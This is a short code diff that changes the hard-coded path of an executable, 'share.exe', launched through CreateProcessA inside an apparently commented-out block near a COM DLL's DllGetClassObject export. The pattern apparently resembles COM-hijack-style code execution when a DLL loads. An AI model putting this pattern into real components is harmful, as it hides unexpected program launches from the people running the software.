@@ -256,7 +256,7 @@ HRESULT STDAPI DllGetClassObject(REFCLSID rclsid,
 	/**
 	// Add your path to the binary on the disk?
 	pCreateProcessA(
-				"C:\\Users\\private\\Desktop\\NewRoz\\Code\\share.exe", 
+				"C:\\share.exe", 
 				"", NULL, NULL, TRUE, 0, NULL, NULL, 
 				&info, &processInfo);
 	
